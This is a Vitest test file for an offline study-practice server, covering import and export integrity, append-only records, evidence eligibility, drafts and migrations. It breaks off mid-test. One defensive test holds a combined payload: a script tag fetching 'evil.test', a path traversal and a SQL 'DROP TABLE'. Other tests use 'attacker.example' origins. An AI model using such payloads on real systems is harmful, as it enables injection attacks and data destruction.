import { afterEach, describe, expect, it, vi } from 'vitest';
import { DatabaseSync } from 'node:sqlite';
import { readFileSync, readdirSync, mkdirSync } from 'node:fs';
import { getReadiness } from '../../packages/shared/src/index.js';
import { randomUUID } from 'node:crypto';
import { mkdtempSync, rmSync } from 'node:fs';
import { resolve } from 'node:path';
import type { FastifyInstance } from 'fastify';
import type { Catalog } from '../../packages/shared/src/index.js';
import { createSeiServer, exportAnkiTsv } from './src/app.js';
import { SeiStore, sha256 } from './src/store.js';

const root=resolve('runtime/test-private');
const source={id:'source.v1',url:'https://example.org/official',title:'Synthetic official-source fixture',retrievedAt:'2026-11-08T12:00:00.000Z',effectiveDate:null,sha256:'a'.repeat(64),excerpt:'Synthetic fixture only',reviewState:'source_compared' as const,version:1};
const mentor={id:'text.math',version:1,title:'Synthetic mentor',discipline:'math',text:'A rate compares change.',originKind:'authored_practice' as const,sha256:sha256('A rate compares change.')};
export const syntheticCatalog:Catalog={schemaVersion:1,sources:[source],objectives:[{id:'mtel56.obj.0001',version:1,sourceVersionId:source.id,text:'Synthetic objective'}],statements:[{id:'statement.1',version:1,objectiveId:'mtel56.obj.0001',sourceVersionId:source.id,text:'Synthetic statement'}],competencies:[],indicators:[],skills:[{id:'skill.a',version:1,title:'A skill',status:'source_checked'}],alignments:[{id:'alignment.a',skillId:'skill.a',statementId:'statement.1',frameworkKind:'mtel',rationale:'Synthetic mapping',sourceVersionId:source.id}],prerequisites:[],lessons:[],cards:[{id:'card.a',front:'<script>test</script>\nQuestion\t?',back:'Answer',source:source.url,tags:['skill_a','v1']}],mentorTexts:[mentor],rubrics:[{id:'rubric.a',version:1,sourceVersionId:source.id,criteria:[{id:'reasoning',title:'Reasoning',text:'Synthetic diagnostic criterion'}],scale:{'1':'Beginning','2':'Developing','3':'Adequate','4':'Strong',U:'Unscorable',B:'Blank'}}],reviewEvents:[],tasks:[
{id:'task.mc',version:1,kind:'mc',title:'MC',prompt:'Which?',options:[{id:'a',text:'Right'},{id:'b',text:'Wrong'}],answerKey:{accepted:['a'],feedback:'Correct reasoning matters.',wrongFeedback:{b:'A language survey identifies a question to investigate, not a proficiency score.'}},reviewState:'source_checked',sourceRefs:[source.id],skillIds:['skill.a'],familyId:'family.a',noveltyKind:'familiar'},
{id:'task.short',version:1,kind:'short',title:'Short',prompt:'Recall',answerKey:{accepted:['listening'],feedback:'Listening is receptive oral language.',wrongFeedback:{}},reviewState:'source_checked',sourceRefs:[source.id],skillIds:['skill.a'],familyId:'family.b',noveltyKind:'unfamiliar'},
{id:'task.writing',version:1,kind:'writing',title:'Writing',prompt:'Derived practice',reviewState:'source_checked',sourceRefs:[source.id],skillIds:['skill.a'],familyId:'family.writing',noveltyKind:'unfamiliar',mentorTextId:mentor.id,mentorTextVersion:mentor.version,mentorTextSha256:mentor.sha256,rubricVersionId:'rubric.a@1',parts:[1,2,3,4,5].map(n=>({id:`part.${n}`,title:`Part ${n}`,prompt:'Use the same mentor text.'}))},
]};
const apps:FastifyInstance[]=[],stores:SeiStore[]=[],dirs:string[]=[];
afterEach(async()=>{vi.useRealTimers();await Promise.all(apps.splice(0).map(a=>a.close()));stores.splice(0).forEach(s=>s.close());for(const dir of dirs.splice(0)){if(!dir.startsWith(root))throw new Error('Unsafe temporary path');rmSync(dir,{recursive:true,force:true});}});
async function app(){const a=await createSeiServer({dbPath:':memory:',catalog:syntheticCatalog});apps.push(a);const session=await a.inject({url:'/api/session',headers:{host:'127.0.0.1:4317'}});const cookie=String(session.headers['set-cookie']).split(';')[0];return {a,headers:{host:'127.0.0.1:4317',origin:'http://127.0.0.1:4317',cookie,'x-csrf-token':session.json().csrfToken}};}
function store(){const s=new SeiStore(syntheticCatalog,':memory:');stores.push(s);return s;}
const submit={taskId:'task.mc',taskVersion:1,answer:'a',hintCount:0};

describe('reviewed merged-history and writing-import regressions',()=>{
  it.each([false,true])('retains recheck through both import orders and reordered roundtrips (reverse=%s)',reverse=>{
    vi.useFakeTimers();const a=store(),b=store(),target=store();
    vi.setSystemTime('2026-01-01T12:00:00Z');a.submit(submit,'a');
    vi.setSystemTime('2026-01-02T12:00:00Z');a.submit({...submit,taskId:'task.short',answer:'listening'},'a');
    vi.setSystemTime('2026-01-03T12:00:00Z');const failure=a.submit({...submit,answer:'b'},'a');
    const readiness=(s:SeiStore)=>{const state=s.state();return getReadiness('skill.a',syntheticCatalog,state.attempts,state.judgments,state.evidenceEvents,state.taskVersions);};
    expect(readiness(a).status).toBe('needs_recheck');
    vi.setSystemTime('2026-01-03T00:00:00Z');b.submit(submit,'b');
    vi.setSystemTime('2026-01-05T12:00:00Z');
    const originals=[a.exportData(),b.exportData()];
    for(const data of reverse?[...originals].reverse():originals)target.importData(data);
    expect(readiness(target).status).toBe('needs_recheck');
    expect(readiness(target).exclusions.find(e=>e.attemptId===failure.attempt.id)?.reason).toContain('Feedback-dependent');
    const merged=target.exportData();merged.attempts.reverse();merged.judgments.reverse();merged.evidenceEvents.reverse();
    const roundtrip=store();roundtrip.importData(merged);expect(readiness(roundtrip).status).toBe('needs_recheck');
    for(const data of originals){
      for(const row of data.attempts)expect(roundtrip.state().attempts.find(a=>a.id===row.id)).toEqual(row);
      for(const row of data.judgments)expect(roundtrip.state().judgments.find(j=>j.id===row.id)).toEqual(row);
      for(const row of data.evidenceEvents)expect(roundtrip.state().evidenceEvents.find(e=>e.id===row.id)).toEqual(row);
    }
    vi.setSystemTime('2026-01-03T12:01:00Z');roundtrip.submit({...submit,parentAttemptId:failure.attempt.id},'correction');
    expect(readiness(roundtrip).status).toBe('needs_recheck');
    vi.setSystemTime('2026-01-04T12:01:00Z');const retest=roundtrip.submit({...submit,parentAttemptId:failure.attempt.id,startedAt:new Date().toISOString()},'retest');
    expect(retest.evidenceEvents[0].eligible).toBe(true);expect(readiness(roundtrip).status).toBe('transfer_evidence');
  });

  const writingAnswer=()=>({mentorTextId:mentor.id,mentorTextVersion:mentor.version,mentorTextHash:mentor.sha256,parts:Object.fromEntries([1,2,3,4,5].map(i=>[`part.${i}`,`Synthetic part ${i}`]))});
  it.each(['missing mentor','null mentor','scalar','missing parts','array parts','missing part','extra part','nonstring part','wrong version','wrong hash','answer version','answer hash'])('rejects %s atomically in preview and import',async variant=>{
    const s=store();s.submit(submit,'valid');s.submit({...submit,taskId:'task.writing',answer:writingAnswer()},'writing');
    const data=s.exportData(),attempt=data.attempts[1];
    const answer=writingAnswer();
    switch(variant){
      case 'missing mentor': Reflect.deleteProperty(attempt,'mentorText');attempt.originalAnswer='scalar bypass';break;
      case 'null mentor': attempt.mentorText=null;attempt.originalAnswer='scalar bypass';break;
      case 'scalar': attempt.originalAnswer='scalar bypass';break;
      case 'missing parts': attempt.originalAnswer={mentorTextId:mentor.id,mentorTextVersion:mentor.version,mentorTextHash:mentor.sha256};break;
      case 'array parts': attempt.originalAnswer={...answer,parts:['one','two','three','four','five']};break;
      case 'missing part': delete answer.parts['part.5'];attempt.originalAnswer=answer;break;
      case 'extra part': answer.parts.extra='extra';attempt.originalAnswer=answer;break;
      case 'nonstring part': attempt.originalAnswer={...answer,parts:{...answer.parts,'part.5':null}};break;
      case 'wrong version': attempt.mentorText!.version=2;break;
      case 'wrong hash': attempt.mentorText!.sha256='b'.repeat(64);break;
      case 'answer version': attempt.originalAnswer={...answer,mentorTextVersion:2};break;
      case 'answer hash': attempt.originalAnswer={...answer,mentorTextHash:'b'.repeat(64)};break;
    }
    const {a,headers}=await app();
    const before=(await a.inject({url:'/api/state',headers})).json();
    for(const url of ['/api/import/preview','/api/import'])expect((await a.inject({method:'POST',url,headers,payload:{payload:data,confirm:true}})).statusCode).toBe(400);
    const after=(await a.inject({url:'/api/state',headers})).json();
    expect(after.attempts).toEqual(before.attempts);expect(after.judgments).toEqual(before.judgments);expect(after.evidenceEvents).toEqual(before.evidenceEvents);
    const target=store();expect(()=>target.inspectImport(data)).toThrow();expect(()=>target.importData(data)).toThrow();
    expect(target.db.prepare('SELECT count(*) AS n FROM import_batches').get()?.n).toBe(0);
    expect(target.state().attempts).toEqual([]);
  });
  it.each(['version','hash','text'])('rejects installed mentor %s mismatches against the immutable task',variant=>{
    const catalog=structuredClone(syntheticCatalog);
    if(variant==='version')catalog.mentorTexts[0].version=2;
    if(variant==='hash')catalog.mentorTexts[0].sha256='b'.repeat(64);
    if(variant==='text')catalog.mentorTexts[0].text='Different installed text';
    const s=new SeiStore(catalog,':memory:');stores.push(s);
    const m=catalog.mentorTexts[0];s.submit({...submit,taskId:'task.writing',answer:{...writingAnswer(),mentorTextVersion:m.version,mentorTextHash:m.sha256}},'writing');
    const target=new SeiStore(catalog,':memory:');stores.push(target);
    expect(()=>target.inspectImport(s.exportData())).toThrow('mentor binding');expect(()=>target.importData(s.exportData())).toThrow('mentor binding');expect(target.state().attempts).toEqual([]);
  });
  it.each(['source_checked','retired'] as const)('imports historical writing versions with a %s current version',reviewState=>{
    const s=store();const original=s.submit({...submit,taskId:'task.writing',answer:writingAnswer()},'writing');const data=s.exportData();
    const target=new SeiStore(structuredClone(syntheticCatalog),':memory:');stores.push(target);
    // Install a new version while retaining the immutable historical snapshots.
    const current=structuredClone(syntheticCatalog);current.mentorTexts[0]={...mentor,version:2,text:'New mentor',sha256:sha256('New mentor')};
    current.tasks[2]={...current.tasks[2],version:2,reviewState,mentorTextVersion:2,mentorTextSha256:current.mentorTexts[0].sha256};
    Object.assign(target.catalog,current);target.seedCatalog();
    const substituted=structuredClone(data);substituted.attempts[0].mentorText={id:mentor.id,version:2,sha256:current.mentorTexts[0].sha256};
    substituted.attempts[0].originalAnswer={...writingAnswer(),mentorTextVersion:2,mentorTextHash:current.mentorTexts[0].sha256};
    expect(()=>target.inspectImport(substituted)).toThrow('Mentor text mismatch');expect(()=>target.importData(substituted)).toThrow('Mentor text mismatch');
    expect(target.inspectImport(data).added).toBe(3);expect(target.importData(data).added).toBe(3);
    expect(target.state().attempts[0]).toEqual(original.attempt);expect(target.state().judgments[0]).toEqual(original.judgment);
  });
  it('accepts a valid writing import and explicit provisional proposal approval',async()=>{
    const s=store();const {attempt}=s.submit({...submit,taskId:'task.writing',answer:writingAnswer()},'writing');
    const {a,headers}=await app();const payload=s.exportData();
    for(const url of ['/api/import/preview','/api/import'])expect((await a.inject({method:'POST',url,headers,payload:{payload,confirm:true}})).statusCode).toBe(200);
    const packet=(await a.inject({method:'POST',url:'/api/handoff',headers,payload:{attemptId:attempt.id,includeAnswer:true}})).json().packet;
    const proposal={...packet.returnContract,judgeLabel:'Synthetic reviewer',reason:'Diagnostic only',criteriaFeedback:[{criterionId:'reasoning',comment:'Supported',answerQuotes:['Synthetic part 1'],missingEvidence:[]}],proposedEvidence:[]};
    expect((await a.inject({method:'POST',url:'/api/proposals/preview',headers,payload:{proposal}})).statusCode).toBe(200);
    const approved=await a.inject({method:'POST',url:'/api/proposals/approve',headers,payload:{proposal,confirm:true}});
    expect(approved.statusCode).toBe(200);expect(approved.json().judgment.result.provisional).toBe(true);expect(approved.json().evidenceEvents[0].eligible).toBe(false);
    expect((await a.inject({url:'/api/state',headers})).json().attempts[0]).toEqual(attempt);
  });
});

describe('offline server and immutable interchange',()=>{
  it('isolates optional test ports without expanding production trusted origins',async()=>{
    const alternate=await createSeiServer({dbPath:':memory:',catalog:syntheticCatalog,testPorts:{api:4318,web:5174}});apps.push(alternate);
    expect((await alternate.inject({url:'/api/session',headers:{host:'127.0.0.1:4318',origin:'http://127.0.0.1:5174'}})).statusCode).toBe(200);
    expect((await alternate.inject({url:'/api/state',headers:{host:'127.0.0.1:4317'}})).statusCode).toBe(403);
    const {a}=await app();expect((await a.inject({url:'/api/state',headers:{host:'127.0.0.1:4317',origin:'http://127.0.0.1:5174'}})).statusCode).toBe(403);
    await expect(createSeiServer({dbPath:':memory:',catalog:syntheticCatalog,testPorts:{api:80,web:5174}})).rejects.toThrow();
    await expect(createSeiServer({catalog:syntheticCatalog,testPorts:{api:4318,web:5174}})).rejects.toThrow('isolated test database');
  });
  it('compares imported timestamps chronologically across fractional precision',()=>{const s=store(),other=store();s.submit(submit,randomUUID());const data=s.exportData();data.attempts[0].startedAt='2026-01-01T00:00:00.999Z';data.attempts[0].submittedAt='2026-01-01T00:00:00Z';expect(()=>other.importData(data)).toThrow('Attempt metadata mismatch');});
  it('imports valid revisions regardless of their order in the payload',()=>{const s=store(),other=store();const first=s.submit(submit,randomUUID());s.submit({...submit,parentAttemptId:first.attempt.id,answer:'b'},randomUUID());const data=s.exportData();data.attempts.reverse();data.judgments.reverse();data.evidenceEvents.reverse();expect(other.importData(data).added).toBe(6);expect(other.state().attempts).toHaveLength(2);});
  it('creates a consistent backup while the source database is live in WAL mode',async()=>{const {mkdirSync}=await import('node:fs');mkdirSync(root,{recursive:true});const dir=mkdtempSync(resolve(root,'backup-'));dirs.push(dir);const original=new SeiStore(syntheticCatalog,resolve(dir,'live.sqlite'));stores.push(original);const {attempt}=original.submit(submit,randomUUID());await original.backupTo(resolve(dir,'snapshot.sqlite'));const snapshot=new SeiStore(syntheticCatalog,resolve(dir,'snapshot.sqlite'));stores.push(snapshot);expect(snapshot.state().attempts[0].id).toBe(attempt.id);expect(snapshot.db.prepare('PRAGMA integrity_check').get()?.integrity_check).toBe('ok');});
  it('bounds nested JSON and excludes session secrets from exports and handoffs',async()=>{const {a,headers}=await app();let deep:unknown='answer';for(let i=0;i<45;i++)deep={nested:deep};expect((await a.inject({method:'PUT',url:'/api/drafts/task.short',headers,payload:{answer:deep}})).statusCode).toBe(400);const attempt=(await a.inject({method:'POST',url:'/api/attempts',headers,payload:submit})).json().attempt;const exported=await a.inject({url:'/api/export',headers});const packet=await a.inject({method:'POST',url:'/api/handoff',headers,payload:{attemptId:attempt.id,includeAnswer:true}});for(const output of [exported.body,packet.body]){expect(output).not.toContain(headers.cookie.split('=')[1]);expect(output).not.toContain(headers['x-csrf-token']);}});
  it('rejects attempt self-parenting and missing source snapshots',()=>{const s=store(),other=store();s.submit(submit,randomUUID());const data=s.exportData();data.attempts[0].parentAttemptId=data.attempts[0].id;expect(()=>other.importData(data)).toThrow('Invalid parent');const missing=s.exportData();missing.catalog.sources=[];expect(()=>other.importData(missing)).toThrow('Missing referenced source');});
  it('rejects untrusted hosts/origins and missing session token',async()=>{const {a,headers}=await app();expect((await a.inject({url:'/api/state',headers:{host:'attacker.example'}})).statusCode).toBe(403);expect((await a.inject({method:'POST',url:'/api/attempts',headers:{...headers,origin:'https://attacker.example'},payload:submit})).statusCode).toBe(403);expect((await a.inject({method:'POST',url:'/api/attempts',headers:{host:headers.host,origin:headers.origin},payload:submit})).statusCode).toBe(403);expect((await a.inject({method:'POST',url:'/api/attempts',headers,payload:submit})).statusCode).toBe(200);});
  it('persists wrong-turn feedback, original answer and hinted exclusion',async()=>{const {a,headers}=await app();const response=await a.inject({method:'POST',url:'/api/attempts',headers,payload:{...submit,answer:'b',hintCount:1}});const body=response.json();expect(body.attempt.originalAnswer).toBe('b');expect(body.judgment.result.status).toBe('incorrect');expect(body.judgment.result.feedback).toContain('not a proficiency score');expect(body.evidenceEvents[0].eligible).toBe(false);expect(JSON.stringify(body)).not.toContain(headers.cookie.split('=')[1]);});
  it('leaves ambiguous short answers unscored',()=>{const s=store();const result=s.submit({...submit,taskId:'task.short',answer:'receiving oral meaning'},randomUUID());expect(result.judgment.result.status).toBe('needs_review');expect(result.evidenceEvents[0].eligible).toBe(false);});
  it('rejects updates and deletion of original attempts and judgments',()=>{const s=store(),{attempt}=s.submit(submit,randomUUID());expect(()=>s.db.prepare('UPDATE attempts SET original_answer_json=? WHERE id=?').run('"b"',attempt.id)).toThrow('Append-only');expect(()=>s.db.exec('DELETE FROM judgments')).toThrow('Append-only');expect(s.state().attempts[0].originalAnswer).toBe('a');});
  it('imports duplicate exports without changes and rejects conflicts atomically',()=>{const s=store(),other=store();s.submit(submit,randomUUID());const data=s.exportData();expect(other.importData(data).added).toBe(3);expect(other.importData(data).added).toBe(0);const conflict=structuredClone(data);conflict.attempts[0].originalAnswer='b';expect(()=>other.importData(conflict)).toThrow('Immutable ID conflict');expect(other.state().attempts).toEqual(s.state().attempts);});
  it('rolls back the entire batch when a late record has an orphan reference',()=>{const s=store(),other=store();s.submit(submit,randomUUID());const data=s.exportData();data.evidenceEvents[0].judgmentId=randomUUID();expect(()=>other.importData(data)).toThrow('Unknown or mismatched');expect(other.state().attempts).toEqual([]);expect(other.db.prepare('SELECT count(*) AS n FROM import_batches').get()?.n).toBe(0);});
  it('rejects forged authored grades and forged evidence eligibility',()=>{const s=store(),other=store();s.submit({...submit,answer:'b',hintCount:1},randomUUID());const grade=s.exportData();grade.judgments[0].result.status='correct';expect(()=>other.importData(grade)).toThrow('conflicts with immutable answer key');const data=s.exportData();data.evidenceEvents[0].eligible=true;expect(()=>other.importData(data)).toThrow('Evidence does not match');});
  it('keeps malicious answer text inert and rejects executable envelope fields',()=>{const s=store(),other=store();const text='<script>fetch("https://evil.test")</script> ../../outside.txt DROP TABLE attempts;';s.submit({...submit,taskId:'task.short',answer:text},randomUUID());const data=s.exportData();other.importData(data);expect(other.state().attempts[0].originalAnswer).toBe(text);expect(()=>other.importData({...data,execute:'anything'})).toThrow();});
  it('preserves attempts and drafts across database restart',async()=>{const {mkdirSync}=await import('node:fs');mkdirSync(root,{recursive:true});const dir=mkdtempSync(resolve(root,'test-'));dirs.push(dir);const dbPath=resolve(dir,'study.sqlite');const first=new SeiStore(syntheticCatalog,dbPath);first.submit(submit,randomUUID());first.saveDraft('task.short',1,'Recover this answer');first.close();const second=new SeiStore(syntheticCatalog,dbPath);stores.push(second);expect(second.state().attempts).toHaveLength(1);expect(second.draft('task.short').answer).toBe('Recover this answer');});
  it('checks all writing parts share the immutable mentor text',()=>{const s=store();expect(()=>s.submit({...submit,taskId:'task.writing',answer:{mentorTextId:'wrong',parts:{}}},randomUUID())).toThrow('exact mentor');const answer={mentorTextId:mentor.id,mentorTextVersion:mentor.version,mentorTextHash:mentor.sha256,parts:Object.fromEntries([1,2,3,4,5].map(i=>[`part.${i}`,`My part ${i}`]))};const result=s.submit({...submit,taskId:'task.writing',answer},randomUUID());expect(result.attempt.mentorText?.sha256).toBe(mentor.sha256);expect(result.attempt.originalAnswer).toEqual(answer);expect(result.judgment.result.status).toBe('needs_review');});
  it('requires explicit import confirmation and never claims synced Anki or models',async()=>{const {a,headers}=await app();const data=(await a.inject({url:'/api/export',headers})).json();expect((await a.inject({method:'POST',url:'/api/import',headers,payload:{payload:data}})).statusCode).toBe(400);const state=(await a.inject({url:'/api/state',headers})).json();expect(state.anki.reviewsSynchronized).toBe(false);expect(state.models).toEqual({enabled:false,calls:0});});
  it('escapes Anki HTML, tabs and newlines and keeps stable ID first',()=>{const output=exportAnkiTsv(syntheticCatalog);expect(output).toContain('StableID\tFront\tBack\tSource\tTags');expect(output).toContain('card.a\t&lt;script&gt;test&lt;/script&gt;<br>Question ?');expect(output).not.toContain('<script>');});
  it('validates handoff identities and literal quotes before explicit approval',async()=>{const {a,headers}=await app();const attempt=(await a.inject({method:'POST',url:'/api/attempts',headers,payload:{...submit,taskId:'task.short',answer:'Listening is receiving spoken meaning'}})).json().attempt;const packet=(await a.inject({method:'POST',url:'/api/handoff',headers,payload:{attemptId:attempt.id,includeAnswer:true,includeHints:true}})).json().packet;const proposal={...packet.returnContract,judgeLabel:'Synthetic reviewer',reason:'Diagnostic only',criteriaFeedback:[{criterionId:'reasoning',comment:'Supported',answerQuotes:['receiving spoken meaning'],missingEvidence:[]}],proposedEvidence:[]};expect((await a.inject({method:'POST',url:'/api/proposals/preview',headers,payload:{proposal:{...proposal,taskVersion:99}}})).statusCode).toBe(400);expect((await a.inject({method:'POST',url:'/api/proposals/preview',headers,payload:{proposal:{...proposal,criteriaFeedback:[{...proposal.criteriaFeedback[0],answerQuotes:['fabricated phrase']}]}}})).statusCode).toBe(400);expect((await a.inject({method:'POST',url:'/api/proposals/preview',headers,payload:{proposal}})).statusCode).toBe(200);const before=(await a.inject({url:'/api/state',headers})).json();expect(before.judgments).toHaveLength(1);const approved=await a.inject({method:'POST',url:'/api/proposals/approve',headers,payload:{proposal,confirm:true}});expect(approved.statusCode).toBe(200);expect(approved.json().judgment.result.provisional).toBe(true);expect(approved.json().evidenceEvents[0].eligible).toBe(false);const after=(await a.inject({url:'/api/state',headers})).json();expect(after.attempts[0]).toEqual(attempt);expect(after.judgments).toHaveLength(2);});
});

describe('review fixes: feedback dependence and version recovery',()=>{
  it('round-trips same-millisecond evidence with its original generation context',()=>{
    vi.useFakeTimers();vi.setSystemTime('2026-01-01T12:00:00Z');const s=store(),target=store();
    const first=s.submit(submit,'session'),second=s.submit(submit,'session');
    expect(first.evidenceEvents[0].eligibilityContextAttemptIds).toEqual([]);
    expect(second.evidenceEvents[0].eligibilityContextAttemptIds).toEqual([first.attempt.id]);
    expect(second.evidenceEvents[0].eligible).toBe(false);
    const data=s.exportData();data.attempts.reverse();expect(target.importData(data).added).toBe(6);
    expect(target.importData(data).added).toBe(0);expect(target.state().evidenceEvents).toEqual(data.evidenceEvents);
  });
  it('preserves recorded events when merged history expands their feedback context',()=>{
    vi.useFakeTimers();vi.setSystemTime('2026-01-02T12:00:00Z');const a=store(),b=store(),target=store();
    a.submit(submit,'a');vi.setSystemTime('2026-01-02T00:00:00Z');b.submit({...submit,answer:'b'},'b');vi.setSystemTime('2026-01-03T12:00:00Z');
    const later=a.exportData(),earlier=b.exportData();target.importData(later);target.importData(earlier);
    const state=target.state();expect(state.evidenceEvents).toEqual([...later.evidenceEvents,...earlier.evidenceEvents]);
    expect(getReadiness('skill.a',syntheticCatalog,state.attempts,state.judgments,state.evidenceEvents,state.taskVersions).eligibleCount).toBe(0);
    const roundTrip=store();expect(roundTrip.importData(target.exportData()).added).toBe(6);
  });
  it('rejects missing, self and unrelated recorded eligibility context references',()=>{
    const s=store(),target=store();s.submit(submit,'session');const data=s.exportData();
    data.evidenceEvents[0].eligibilityContextAttemptIds=[randomUUID()];expect(()=>target.importData(data)).toThrow('Invalid recorded eligibility context');
    data.evidenceEvents[0].eligibilityContextAttemptIds=[data.attempts[0].id];expect(()=>target.importData(data)).toThrow('Invalid recorded eligibility context');
    delete data.evidenceEvents[0].eligibilityContextAttemptIds;expect(()=>target.importData(data)).toThrow('Policy v2 evidence');
  });
  it('excludes immediate wrong-to-right and right-to-edited revisions on the server',()=>{
    vi.useFakeTimers();vi.setSystemTime('2026-01-01T12:00:00Z');
    const s=store(),first=s.submit({...submit,answer:'b'},'session');
    vi.setSystemTime('2026-01-01T12:00:01Z');
    const correction=s.submit({...submit,parentAttemptId:first.attempt.id},'session');
    expect(correction.evidenceEvents[0]).toMatchObject({eligible:false,independence:'assisted',eligibilityPolicyVersion:2});
    expect(correction.evidenceEvents[0].exclusionReason).toContain('Feedback-dependent');
    vi.setSystemTime('2026-01-01T12:00:02Z');
    expect(s.submit({...submit,parentAttemptId:correction.attempt.id},'session').evidenceEvents[0].eligible).toBe(false);
    expect(s.submit(submit,'new-session').evidenceEvents[0].eligible).toBe(false);
    expect(s.state().attempts[0]).toEqual(first.attempt);
  });
  it('allows a fresh retest begun after24 hours even when retaining parent lineage',()=>{
    vi.useFakeTimers();vi.setSystemTime('2026-01-01T12:00:00Z');const s=store(),first=s.submit({...submit,answer:'b'},'session');
    vi.setSystemTime('2026-01-02T12:00:00Z');
    const result=s.submit({...submit,parentAttemptId:first.attempt.id,startedAt:new Date().toISOString()},'session');
    expect(result.evidenceEvents[0].eligible).toBe(true);
  });
  it('does not turn an old open draft into independent work by delaying its submission',()=>{
    vi.useFakeTimers();vi.setSystemTime('2026-01-01T12:00:00Z');const s=store(),first=s.submit({...submit,answer:'b'},'session');
    vi.setSystemTime('2026-01-03T12:00:00Z');
    expect(s.submit({...submit,parentAttemptId:first.attempt.id,startedAt:'2026-01-01T12:00:01Z'},'session').evidenceEvents[0].eligible).toBe(false);
  });
  it('retains legacy feedback-trained event bytes while effective readiness excludes them',()=>{
    vi.useFakeTimers();vi.setSystemTime('2026-01-01T12:00:00Z');const s=store(),target=store();
    const first=s.submit({...submit,answer:'b'},'session');vi.setSystemTime('2026-01-01T12:00:01Z');
    s.submit({...submit,parentAttemptId:first.attempt.id},'session');vi.setSystemTime('2026-01-03T12:00:00Z');
    s.submit({...submit,taskId:'task.short',answer:'listening'},'session');
    const legacy=s.exportData();legacy.evidenceEvents=legacy.evidenceEvents.map(e=>s.deriveEvidence(legacy.attempts.find(a=>a.id===e.attemptId)!,legacy.judgments.find(j=>j.id===e.judgmentId)!,[],1).map(x=>({...x,id:e.id}))[0]);
    expect(legacy.evidenceEvents[1].eligible).toBe(true);target.importData(legacy);
    const state=target.state();expect(state.evidenceEvents).toEqual(legacy.evidenceEvents);
    const readiness=getReadiness('skill.a',syntheticCatalog,state.attempts,state.judgments,state.evidenceEvents,state.taskVersions);
    expect(readiness.status).not.toBe('independent_evidence');expect(readiness.eligibleCount).toBe(1);
  });
  it('retains both success and failure task snapshots when v2 becomes active',()=>{
    vi.useFakeTimers();vi.setSystemTime('2026-01-01T12:00:00Z');
    mkdirSync(root,{recursive:true});const dir=mkdtempSync(resolve(root,'versions-'));dirs.push(dir);const path=resolve(dir,'study.sqlite');
    const first=new SeiStore(syntheticCatalog,path);first.submit(submit,'session');vi.setSystemTime('2026-01-03T12:00:00Z');first.submit({...submit,answer:'b'},'session');const before=first.state();first.close();
    const current=structuredClone(syntheticCatalog);current.tasks[0]={...current.tasks[0],version:2,prompt:'Changed prompt'};
    const second=new SeiStore(current,path);stores.push(second);const state=second.state();
    expect(state.attempts).toEqual(before.attempts);expect(state.taskVersions.filter(t=>t.id==='task.mc')).toHaveLength(2);
    const readiness=getReadiness('skill.a',current,state.attempts,state.judgments,state.evidenceEvents,state.taskVersions);
    expect(readiness.status).toBe('needs_recheck');expect(readiness.observedCount).toBe(2);
    expect(()=>second.submit(submit,'session')).toThrow('Task version changed');
  });
  it('returns old practice drafts separately and refuses silent writes across prompt versions',()=>{
    mkdirSync(root,{recursive:true});const dir=mkdtempSync(resolve(root,'drafts-'));dirs.push(dir);const path=resolve(dir,'study.sqlite');
    const first=new SeiStore(syntheticCatalog,path);const old={response:'Unchanged original',hintCount:1};first.saveDraft('task.mc',1,old);first.close();
    const current=structuredClone(syntheticCatalog);current.tasks[0]={...current.tasks[0],version:2,prompt:'New prompt'};
    const second=new SeiStore(current,path);stores.push(second);
    expect(second.draft('task.mc')).toMatchObject({answer:null,taskVersion:'2',olderDrafts:[{answer:old,taskVersion:'1'}]});
    expect(()=>second.saveDraft('task.mc',1,'wrong-version write')).toThrow('Draft task version changed');
    second.saveDraft('task.mc',2,{...old,response:'Deliberately copied'});
    expect(second.draft('task.mc').olderDrafts[0].answer).toEqual(old);
    expect(second.draft('task.mc').answer).toEqual({...old,response:'Deliberately copied'});
  });
  it('detects a changed writing prompt with the same text and validates draft rubric identity',()=>{
    mkdirSync(root,{recursive:true});const dir=mkdtempSync(resolve(root,'writing-version-'));dirs.push(dir);const path=resolve(dir,'study.sqlite');
    const answer={mentorTextId:mentor.id,mentorTextVersion:mentor.version,mentorTextHash:mentor.sha256,rubricVersionId:'rubric.a@1',parts:{'part.1':'Original prose'}};
    const first=new SeiStore(syntheticCatalog,path);first.saveDraft('task.writing',1,answer);first.close();
    const current=structuredClone(syntheticCatalog);current.tasks[2]={...current.tasks[2],version:2,prompt:'Changed five-part instructions'};
    const second=new SeiStore(current,path);stores.push(second);expect(second.draft('task.writing').answer).toBe(null);expect(second.draft('task.writing').olderDrafts[0].answer).toEqual(answer);
    expect(()=>second.saveDraft('task.writing',2,{...answer,rubricVersionId:'wrong'})).toThrow('rubric');
  });
  it('requires explicit draft task versions on the API',async()=>{
    const {a,headers}=await app();expect((await a.inject({method:'PUT',url:'/api/drafts/task.mc',headers,payload:{answer:'a'}})).statusCode).toBe(400);
    expect((await a.inject({method:'PUT',url:'/api/drafts/task.mc',headers,payload:{answer:'a',taskVersion:1}})).statusCode).toBe(200);
    expect((await a.inject({url:'/api/drafts/task.mc',headers})).json()).toMatchObject({answer:'a',taskVersion:'1',olderDrafts:[]});
  });
  it('backs up legacy WAL databases before migrating and preserves every old draft',async()=>{
    mkdirSync(root,{recursive:true});const dir=mkdtempSync(resolve(root,'migration-'));dirs.push(dir);const path=resolve(dir,'study.sqlite');
    const legacy=new DatabaseSync(path);legacy.exec(readFileSync('apps/server/src/migrations/001-initial.sql','utf8'));legacy.exec('PRAGMA journal_mode=WAL');
    legacy.prepare('INSERT INTO schema_migrations(version,applied_at) VALUES(1,?)').run(new Date().toISOString());
    const task=syntheticCatalog.tasks[0];legacy.prepare('INSERT INTO tasks(id,version,kind,prompt_json,answer_key_json_nullable,review_state,source_refs_json,mentor_text_id_nullable,rubric_version_id_nullable,entity_json) VALUES(?,?,?,?,?,?,?,?,?,?)').run(task.id,'1',task.kind,JSON.stringify({prompt:task.prompt,parts:[]}),JSON.stringify(task.answerKey),task.reviewState,JSON.stringify(task.sourceRefs),null,null,JSON.stringify(task));
    legacy.prepare('INSERT INTO drafts(task_id,task_version,answer_json,updated_at) VALUES(?,?,?,?)').run(task.id,'1','"Preserve exact prose"','2026-01-01T12:00:00Z');
    expect(()=>new SeiStore(syntheticCatalog,path)).toThrow('pre-migration backup');
    const migrated=await SeiStore.open(syntheticCatalog,path);stores.push(migrated);expect(migrated.draft(task.id).answer).toBe('Preserve exact prose');
    expect(migrated.db.prepare('SELECT answer_json FROM drafts_legacy_v1').get()?.answer_json).toBe('"Preserve exact prose"');
    const backupFiles=readdirSync(resolve(dir,'backups'));expect(backupFiles).toHaveLength(1);
